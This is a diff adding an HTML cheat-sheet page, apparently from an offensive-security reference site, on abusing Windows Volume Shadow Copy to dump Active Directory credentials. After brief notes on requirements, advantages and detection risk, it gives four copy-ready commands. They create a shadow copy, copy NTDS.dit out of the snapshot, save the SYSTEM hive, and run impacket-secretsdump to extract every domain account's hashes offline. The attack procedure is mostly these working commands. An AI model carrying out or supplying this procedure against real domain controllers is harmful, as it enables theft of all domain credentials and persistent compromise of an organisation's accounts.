@@ -1,0 +1,84 @@
+<section class="page active prose-page">
+  <h1>Shadow Copy</h1>
+
+  <p class="intro">
+    Shadow Copy (Volume Shadow Copy Service - VSS) is a Windows snapshot feature that can be abused to obtain a copy of
+    the Active Directory database (NTDS.dit) and the SYSTEM registry hive. These files can then be extracted offline to
+    recover NTLM hashes, Kerberos keys, and other credential material for every domain account. The technique is commonly
+    used for credential dumping and long-term persistence.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Requirements</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Local Administrator or Domain Administrator privileges on a Domain Controller.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Advantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Extracts all domain credentials offline without directly accessing a live NTDS.dit database.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Disadvantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Requires privileged access to a Domain Controller and VSS activity can be logged and detected.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Create Shadow Copy</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">vshadow.exe -nw -p C:</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Copy NTDS.dit</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Save SYSTEM Hive</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">reg.exe save hklm\system c:\system.bak</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Extract Hashes Offline</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
